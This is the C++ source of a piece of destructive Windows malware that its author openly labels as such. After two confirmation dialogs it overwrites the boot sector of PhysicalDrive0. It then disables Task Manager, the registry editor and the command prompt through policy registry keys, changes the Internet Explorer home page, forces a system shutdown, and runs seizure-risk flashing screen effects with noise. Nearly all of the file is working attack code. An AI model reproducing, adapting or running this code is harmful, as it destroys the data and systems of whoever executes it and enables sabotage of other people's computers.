// s.cpp : My final malware for a while due to my depression. :(
// Have this for now


#include <Windows.h>
#include <Cmath>
#pragma comment(lib, "Winmm.lib")
#include <Math.h>
#include "buffer.hpp"
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// Screw that off, extern is better! I didn't mean to offend anybody.
EXTERN_C NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, LPBYTE);




typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF GetUnknownColors(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 255, length);
        }
        else {
            return RGB(red, 255, 255);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 255);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(255, length, blue);
            }
            else {
                red = 255; green = 255; blue = 255;
                ifblue = true;
            }
        }
    }
}

WINBOOL CheckForWindowsXP() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 5) {
		return true;
	}
	return false;
}

int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

DWORD WINAPI text(LPVOID lpvd) { // Code made by me
    HDC hdc;
    HFONT hfnt;
    while (true) {
        hdc = GetDC(0);
        CHAR username[256];
        DWORD dwUserSize = sizeof(username);
        GetUserNameA(username, &dwUserSize);
        hfnt = CreateFontA(rand() % 201, 0, 0, 0, FW_MEDIUM, false, false, false, ANSI_CHARSET, 0, 0, 0, 0, "Serif");
        SelectObject(hdc, hfnt);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, RGB(0, 0, 255));
        TextOutA(hdc, rand() % w, rand() % h, username, strlen(username));
//        fclr += M_PI / 6;
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (1 * 1 + x) + (x * y + i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI y(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
		HBRUSH brush = CreateSolidBrush(GetUnknownColors(239));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, SRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(rand() % 123);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}

void sound() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t*t>>15|t)-t)/15);

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void NotWindowsXP() {
  MessageBoxA(NULL, "LMAOOOOOOOOO MY GUY THOUGHT HE CAN BEAT THE SYSTEM", "s.exe", MB_ICONERROR|MB_OK);
  exit(0);
}

// Destruction //

FLONG WINAPI RegAddW(HKEY hKey, LPCWSTR lpSubkey, LPCWSTR lpValueName, DWORD dwType, BYTE bValue) {
	HKEY hkResult;
	RegCreateKeyW(hKey, lpSubkey, &hkResult);
	RegSetValueExW(hkResult, lpValueName, 0, dwType, &bValue, sizeof(bValue));
	RegCloseKey(hkResult);
}

FLONG WINAPI RegSetW(HKEY hKey, LPCWSTR lpSubkey, LPCWSTR lpValueName, DWORD dwType, LPBYTE bValue, bool isString) {
	HKEY hkResult;
	RegOpenKeyW(hKey, lpSubkey, &hkResult);
	if (isString == false) RegSetValueExW(hkResult, lpValueName, 0, dwType, bValue, sizeof(bValue));
	else if (isString == true) RegSetValueExW(hkResult, lpValueName, 0, dwType, bValue, sizeof(bValue) * 16);
	RegCloseKey(hkResult);
}

void SetHomePage(void) {
	RegSetW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Internet Explorer\\Main", L"Start Page", REG_SZ, (LPBYTE)L"https://www.youtube.com/@Sickdows", true);
}

void WriteToSectors(void) {
	DWORD dwWriteBytes;
	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hDrive == INVALID_HANDLE_VALUE) {
		MessageBoxW(NULL, L"LMAOOOOOOOOOOOO nice try little timmy now this system will shut down in 5 seconds if you close this\nyou dont get a safe malware \>w\<", L"bye bye little timmy", MB_OK);
		CloseHandle(hDrive);
		BYTE ntByte;
		RtlAdjustPrivilege(19, true, false, &ntByte);
		InitiateSystemShutdownW(NULL, (WCHAR*)L"S is coming for you!", 5, true, false);
	}
	WriteFile(hDrive, rawData, 32768, &dwWriteBytes, NULL);
	CloseHandle(hDrive);
}

void Disabler(void) {
	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableTaskmgr", REG_DWORD, 1);
	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\POLICIES\\SYSTEM", L"DisableRegistryTools", REG_DWORD, 1);
	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1);
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a Short Malware, Run?", L"s.exe by Venra (quick malware)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		return 0;
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will destroy this computer and it contains flashing lights - NOT for epilepsy", L"F?i?n?a?l? ?W?a?r?n?i?n?g? - s.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			return 0;
		}
		else
		{   
		    if (!CheckForWindowsXP()) NotWindowsXP();
		    WriteToSectors();
		    Disabler();
		    SetHomePage();
			Sleep(3000);
	     	MessageBoxW(NULL, L"", L"s.exe", MB_OK);
			Sleep(3000);
	    	CreateThread(0, 0, text, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader, 0, 0, 0);
			sound();
			BYTE ntByte;
			RtlAdjustPrivilege(19, true, false, &ntByte);
			InitiateSystemShutdownW(NULL, (WCHAR*)L"S is coming for you!", 60, true, true);
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);			
			HANDLE thread2 = CreateThread(0, 0, y, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);	
			
    	}

	}
}			
